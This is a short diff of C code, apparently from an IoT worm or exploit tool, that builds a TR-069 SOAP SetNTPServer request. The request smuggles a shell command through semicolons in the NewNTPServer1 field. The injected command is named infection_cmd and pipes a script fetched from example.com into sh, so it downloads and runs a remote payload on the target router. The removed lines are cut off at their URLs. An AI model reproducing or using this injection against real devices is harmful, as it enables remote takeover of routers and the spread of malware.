@@ -108,11 +108,11 @@ static int tr069_check_vulnerability(ipv4_t target_ip)
         close(fd);
         return 0;
     }
-    const char *infection_cmd = "curl -s https:
+    const char *infection_cmd = "curl -s https://example.com/payload.sh | sh";
     char soap_body[1024];
     int body_len = snprintf(soap_body, sizeof(soap_body),
         "<?xml version=\"1.0\"?>\r\n"
-        "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http:
+        "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n"
         "<SOAP-ENV:Body>\r\n"
         "<u:SetNTPServer xmlns:u=\"urn:dslforum-org:service:Time:1\">\r\n"
         "<NewNTPServer1>;%s;</NewNTPServer1>\r\n"
